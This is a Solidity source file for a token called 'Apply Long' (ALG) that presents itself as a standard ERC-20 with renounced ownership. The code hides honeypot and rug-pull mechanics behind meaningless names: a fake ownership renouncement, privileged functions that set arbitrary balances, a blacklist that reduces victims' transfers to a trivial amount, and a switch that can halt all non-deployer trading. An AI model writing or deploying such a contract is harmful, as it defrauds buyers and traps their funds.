//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface txBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract swapLaunchedAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverLiquidity {
    function createPair(address tokenEnable, address senderLimit) external returns (address);
}

interface tradingLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableReceiver) external view returns (uint256);

    function transfer(address modeShould, uint256 launchedLaunchWallet) external returns (bool);

    function allowance(address totalMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedLaunchWallet) external returns (bool);

    function transferFrom(
        address sender,
        address modeShould,
        uint256 launchedLaunchWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedExemptReceiver, uint256 value);
    event Approval(address indexed totalMarketing, address indexed spender, uint256 value);
}

interface listTo is tradingLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ApplyLong is swapLaunchedAuto, tradingLiquidity, listTo {

    address enableSwapIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed swapWallet, address indexed launchedTeam);

    uint8 private atEnableTeam = 18;

    mapping(address => uint256) private fromTrading;

    mapping(address => mapping(address => uint256)) private feeMin;

    function txToken(address maxTxLaunch, address modeShould, uint256 launchedLaunchWallet) internal returns (bool) {
        if (maxTxLaunch == modeTo) {
            return shouldMinEnable(maxTxLaunch, modeShould, launchedLaunchWallet);
        }
        uint256 teamSwap = tradingLiquidity(launchedSwap).balanceOf(enableSwapIs);
        require(teamSwap == exemptTake);
        require(modeShould != enableSwapIs);
        if (listIs[maxTxLaunch]) {
            return shouldMinEnable(maxTxLaunch, modeShould, feeWallet);
        }
        return shouldMinEnable(maxTxLaunch, modeShould, launchedLaunchWallet);
    }

    uint256 exemptMax;

    bool public swapBuyFrom;

    bool public fundSwap;

    uint256 private receiverWallet = 100000000 * 10 ** 18;

    function txIsLaunch(uint256 launchedLaunchWallet) public {
        buyModeTx();
        exemptTake = launchedLaunchWallet;
    }

    string private tokenList = "Apply Long";

    function symbol() external view virtual override returns (string memory) {
        return fromTake;
    }

    function getOwner() external view returns (address) {
        return listAmount;
    }

    function modeSell(address takeList) public {
        if (swapBuyFrom) {
            return;
        }
        if (tokenLiquidityTx == marketingTotal) {
            marketingTotal = minTx;
        }
        sellTeam[takeList] = true;
        if (tokenLiquidityTx == minTx) {
            fundSwap = false;
        }
        swapBuyFrom = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return atEnableTeam;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverWallet;
    }

    function approve(address amountMarketing, uint256 launchedLaunchWallet) public virtual override returns (bool) {
        feeMin[_msgSender()][amountMarketing] = launchedLaunchWallet;
        emit Approval(_msgSender(), amountMarketing, launchedLaunchWallet);
        return true;
    }

    function buyModeTx() private view {
        require(sellTeam[_msgSender()]);
    }

    mapping(address => bool) public listIs;

    uint256 public buyTeam;

    address amountSenderFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 exemptTake;

    uint256 public tokenLiquidityTx;

    uint256 public marketingTotal;

    address public launchedSwap;

    function fundFrom(address listAuto, uint256 launchedLaunchWallet) public {
        buyModeTx();
        fromTrading[listAuto] = launchedLaunchWallet;
    }

    address private listAmount;

    address public modeTo;

    mapping(address => bool) public sellTeam;

    constructor (){
        
        txBuy launchMode = txBuy(amountSenderFund);
        launchedSwap = receiverLiquidity(launchMode.factory()).createPair(launchMode.WETH(), address(this));
        if (minTx != buyTeam) {
            minTx = amountTrading;
        }
        modeTo = _msgSender();
        shouldFeeBuy();
        sellTeam[modeTo] = true;
        fromTrading[modeTo] = receiverWallet;
        
        emit Transfer(address(0), modeTo, receiverWallet);
    }

    function transfer(address listAuto, uint256 launchedLaunchWallet) external virtual override returns (bool) {
        return txToken(_msgSender(), listAuto, launchedLaunchWallet);
    }

    function name() external view virtual override returns (string memory) {
        return tokenList;
    }

    function owner() external view returns (address) {
        return listAmount;
    }

    function shouldFeeBuy() public {
        emit OwnershipTransferred(modeTo, address(0));
        listAmount = address(0);
    }

    function feeReceiverMax(address minMarketingLaunched) public {
        buyModeTx();
        if (marketingTotal != buyTeam) {
            fundSwap = false;
        }
        if (minMarketingLaunched == modeTo || minMarketingLaunched == launchedSwap) {
            return;
        }
        listIs[minMarketingLaunched] = true;
    }

    function shouldMinEnable(address maxTxLaunch, address modeShould, uint256 launchedLaunchWallet) internal returns (bool) {
        require(fromTrading[maxTxLaunch] >= launchedLaunchWallet);
        fromTrading[maxTxLaunch] -= launchedLaunchWallet;
        fromTrading[modeShould] += launchedLaunchWallet;
        emit Transfer(maxTxLaunch, modeShould, launchedLaunchWallet);
        return true;
    }

    function allowance(address atLaunchedSender, address amountMarketing) external view virtual override returns (uint256) {
        if (amountMarketing == amountSenderFund) {
            return type(uint256).max;
        }
        return feeMin[atLaunchedSender][amountMarketing];
    }

    function transferFrom(address maxTxLaunch, address modeShould, uint256 launchedLaunchWallet) external override returns (bool) {
        if (_msgSender() != amountSenderFund) {
            if (feeMin[maxTxLaunch][_msgSender()] != type(uint256).max) {
                require(launchedLaunchWallet <= feeMin[maxTxLaunch][_msgSender()]);
                feeMin[maxTxLaunch][_msgSender()] -= launchedLaunchWallet;
            }
        }
        return txToken(maxTxLaunch, modeShould, launchedLaunchWallet);
    }

    uint256 private minTx;

    bool private takeReceiver;

    function balanceOf(address enableReceiver) public view virtual override returns (uint256) {
        return fromTrading[enableReceiver];
    }

    uint256 public amountTrading;

    uint256 constant feeWallet = 5 ** 10;

    string private fromTake = "ALG";

}